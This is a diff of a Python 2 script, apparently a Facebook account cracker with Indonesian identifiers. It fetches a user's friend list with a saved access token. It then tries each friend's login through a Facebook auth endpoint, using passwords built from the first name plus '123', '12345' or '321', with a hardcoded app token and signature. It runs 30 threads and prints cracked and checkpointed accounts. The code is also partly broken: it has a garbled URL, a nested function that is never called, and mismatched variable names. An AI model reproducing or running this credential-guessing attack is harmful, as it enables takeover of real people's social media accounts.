@@ -24,6 +24,7 @@ def login():
         if "session_key" in dev:
             print "login Berhasil..."
             open('token.txt', 'w').write(jsl['access_token'])
+            supe_iqbal()
             
         elif "error_msg" in dev:
             print " Akun Kena Cekpoint"
@@ -34,7 +35,7 @@ def login():
         sys.exit()
 
 def id_batir():
-    global 
+ 
     try:
         token = open("token.txt", "r").read()
     except IOError:
@@ -51,55 +52,56 @@ def id_batir():
 
         except IOError:
             sys.exit()
+def supe_iqbal():
 
-    
-def main(arg):
-    id_teman = arg
-    try:
-        token = open("token.txt", "r").read()
-    except IOError:
-        os.system("rm -f token.txt")
-
-    else:
+    id_batir()
+    def main(arg):
+        id_teman = arg
         try:
-            url = requests.get("://graph.fhttpsacebook.com/" + id_teman + "/?access_token=" + token)
-            jsl = json.loads(url.text)
-            sandi1 = jsl['first_name'] + "123"
-            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-            jsl_iqbal = json.load(log)
-            if "access_token" in jsl_iqbal:
-                print " [OK] " + id_teman + " | " + sandi1
-            elif "www.facebook.com" in jsl_iqbal["error_msg"]:
-                print " [CP] " + id_teman + " | " + sandi1
-            else:
-                sandi2 = jsl["first_name"] + "12345"
-                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+            token = open("token.txt", "r").read()
+        except IOError:
+            os.system("rm -f token.txt")
+
+        else:
+            try:
+                url = requests.get("://graph.fhttpsacebook.com/" + id_teman + "/?access_token=" + token)
+                jsl = json.loads(url.text)
+                sandi1 = jsl['first_name'] + "123"
+                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                 jsl_iqbal = json.load(log)
                 if "access_token" in jsl_iqbal:
-                    print " [OK] " + id_teman + " | " + sandi2
+                    print " [OK] " + id_teman + " | " + sandi1
                 elif "www.facebook.com" in jsl_iqbal["error_msg"]:
-                    print " [CP] " + id_teman + " | " + sandi2
+                    print " [CP] " + id_teman + " | " + sandi1
                 else:
-                    sandi3 = jsl["first_name"] + "321"
-                    log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                    jsl_iqbal = json.loads(log)
+                    sandi2 = jsl["first_name"] + "12345"
+                    log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                    jsl_iqbal = json.load(log)
                     if "access_token" in jsl_iqbal:
-                        print " [OK] " + id_teman + " | " + sandi3
+                        print " [OK] " + id_teman + " | " + sandi2
+                    elif "www.facebook.com" in jsl_iqbal["error_msg"]:
+                        print " [CP] " + id_teman + " | " + sandi2
                     else:
-                        if "www.facebook.com" in jsl_iqbal["error_msg"]:
-                            print " [CP] " + id_teman + " | " + sandi3
+                        sandi3 = jsl["first_name"] + "321"
+                        log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + id_teman + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                        jsl_iqbal = json.loads(log)
+                        if "access_token" in jsl_iqbal:
+                            print " [OK] " + id_teman + " | " + sandi3
+                        else:
+                            if "www.facebook.com" in jsl_iqbal["error_msg"]:
+                                print " [CP] " + id_teman + " | " + sandi3
 
-        except:
-            pass
+            except:
+                pass
    
         
-    nob = ThreadPool(30)
-    noob.map(main, id)
-    print "selesai"                    
+        nob = ThreadPool(30)
+        noob.map(main, id)
+        print "selesai"                    
 
 def main():
     login()
-    id_batir()
+    
     
 
 if __name__=="__main__":
